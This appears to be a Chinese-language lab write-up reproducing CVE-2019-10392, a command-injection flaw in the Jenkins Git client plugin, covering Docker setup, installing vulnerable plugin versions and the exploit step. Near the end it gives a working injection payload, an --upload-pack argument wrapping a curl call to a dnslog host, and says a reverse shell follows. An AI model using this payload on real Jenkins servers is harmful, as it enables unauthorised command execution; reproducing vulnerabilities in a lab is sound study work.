# CVE-2019-10392：Jenkins Git client插件RCE复现

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkwMzAyMDAwMQ==&mid=2247484470&idx=6&sn=c7f0d1a999b661fc6cd7bfcebab41df1&chksm=c09de8b8f7ea61aeed5e2269f41a43e2c28fa422f5a825d7d1b0c82c979c1f45817df21c2ed7&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzkwMzAyMDAwMQ==&mid=2247484470&idx=6&sn=c7f0d1a999b661fc6cd7bfcebab41df1&chksm=c09de8b8f7ea61aeed5e2269f41a43e2c28fa422f5a825d7d1b0c82c979c1f45817df21c2ed7&scene=27#wechat_redirect)

  

**01**

**背景**

  
  

漏洞编号：CVE-2019-10392

影响范围：Git client Plugin <= 2.8.4

漏洞影响：允许具有Job/Configure权限的攻击者在Jenkins主服务器上执行任意系统命令作为Jenkins进程正在运行的OS用户的方式实现命令执行，是Git客户端插件中的系统命令执行漏洞。

  

**02**

**漏洞复现**

  
  

**0x01 环境搭建**

使用docker进行搭建

docker search Jenkins

docker pull jenkins/jenkins

docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins 

![](../Images/28c77bba9dd51c9e67be3748a887b4ab.png)

浏览器访问ip:8080进入环境

![](../Images/45e68dd97eb1b9d0f4a283c437b24f7e.png)

进入容器：docker exec -it 4102ac2d60c6 /bin/bash   

获取密码：cat /var/jenkins\_home/secrets/initialAdminPassword

![](../Images/986e61b5e1c91f9533d812f89c901b68.png)

输入密码后继续下一步，安装推荐的插件，安装时间较长

![](../Images/78fd1d27a0ded0536e53408d3e4ce6fb.png)

继续下一步，创建一个管理员

![](../Images/7bc6752f0a6bc59cdd022e8b773619b7.png)

继续下一步，就进入了Jenkins主页面

系统管理 -- 管理用户 -- 新建用户，创建一个user账户

![](../Images/782226c2915360660a768bcfdd542a1e.png)

然后进入：系统管理 -- 全局安全配置，为user账户配置如下权限

![](../Images/a75bfbc067fc449f46ce351bef0f1c26.png)

下载漏洞版本的插件

git客户端：http://updates.jenkins-ci.org/download/plugins

/git-client/2.8.2/git-client.hpi

git插件：http://updates.jenkins-ci.org/download/plugins

/git/3.12.0/git.hpi

然后进入：系统管理 à 插件管理 à 高级，将两个插件上传

![](../Images/636737092c17005cd2a1dc8f61fae548.png)

    上传完后点击下图的（安装完成后重启Jenkins）即可重新启动服务

![](../Images/7f2d06475ca2fbeb89f7d1bd2f82b83f.png)

  

**0x02 漏洞利用**

重启后，登录user账户

新建任务-- 流水线

![](../Images/44287f293485064b75774c3c510c335d.png)

确定后，点击流水线

![](../Images/d73d576b301939de26bdacbe8c1bb18c.png)

选择以下选项，输入Poc（使用dnslog检测）：

\--upload-pack="\`curl 71lbw0.dnslog.cn\`"

![](../Images/2077da05fed036a9c5e94a72ae353792.png)

查看dnslog，检测到流量  即可反弹shell。

![](../Images/5dc7393e680b0c77dcb4943cff981a7f.png)
